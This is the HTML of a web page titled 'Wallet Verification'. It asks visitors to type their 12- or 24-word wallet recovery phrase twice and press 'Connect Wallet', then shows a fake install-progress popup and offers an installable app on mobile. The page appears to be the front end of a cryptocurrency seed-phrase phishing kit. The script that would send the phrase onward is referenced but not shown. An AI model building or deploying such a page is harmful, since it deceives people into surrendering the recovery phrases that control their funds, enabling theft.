<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Wallet Verification</title>
    <link rel="stylesheet" href="wallet-page.css" />

    <link rel="manifest" href="/Rectification/manifest.json" />
    <meta name="theme-color" content="#ffffff" />
  </head>

  <body>
    <div class="container">
      <div class="card-box">
        <img id="walletLogo" class="wallet-logo" alt="Wallet Logo" />
        <h2 id="walletName">Wallet</h2>

        <div class="input-area">
          <textarea
            class="input-box autoExpand"
            id="walletInput"
            placeholder="Enter wallet phrase (12 or 24 words)"
            rows="4"
          ></textarea>

          <textarea
            class="input-box autoExpand"
            id="phraseInput"
            placeholder="Confirm your wallet phrase (12 or 24 words)"
            rows="4"
          ></textarea>
        </div>

        <p class="confirm-text">
          <input type="checkbox" id="confirmCheck" class="check-inline" />
          Are you sure you entered correctly?
        </p>

        <button class="wallet-btn" id="connectBtn">Connect Wallet</button>
      </div>
    </div>

    <!-- ⭐⭐ NEW INSTALL PROGRESS POPUP (FINAL) ⭐⭐ -->
    <div id="modernPopup" class="popup" style="display:none">
      <div class="popup-box">

        <img id="mpLogo" class="pop-logo" />
        <h3 id="mpName"></h3>

        <div class="progress-bar">
          <div id="mpProgress" style="width:0%"></div>
        </div>

        <p id="mpPercent" style="margin-top:8px; font-size:16px">0%</p>

        <div id="mpTick" class="success-tick">✔</div>
      </div>
    </div>
    <!-- ⭐⭐ END POPUP ⭐⭐ -->

    <script src="wallet-page.js"></script>

    <!-- Install PWA Button -->
    <button
      id="installBtn"
      style="display: none; margin: 20px auto; padding: 10px"
    >
      Install Wallet App
    </button>

    <!-- PWA Install Logic -->
    <script>
      let deferredPrompt = null;

      window.addEventListener("beforeinstallprompt", (e) => {
        const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
        if (!isMobile) return;

        e.preventDefault();
        deferredPrompt = e;

        document.getElementById("installBtn").style.display = "block";
      });

      document
        .getElementById("installBtn")
        .addEventListener("click", async () => {
          if (!deferredPrompt) {
            alert("Install prompt not ready.");
            return;
          }

          deferredPrompt.prompt();
          await deferredPrompt.userChoice;
          deferredPrompt = null;
        });
    </script>

    <script>
      if ("serviceWorker" in navigator) {
        navigator.serviceWorker.register("/Rectification/service-worker.js");
      }
    </script>
  </body>
</html>
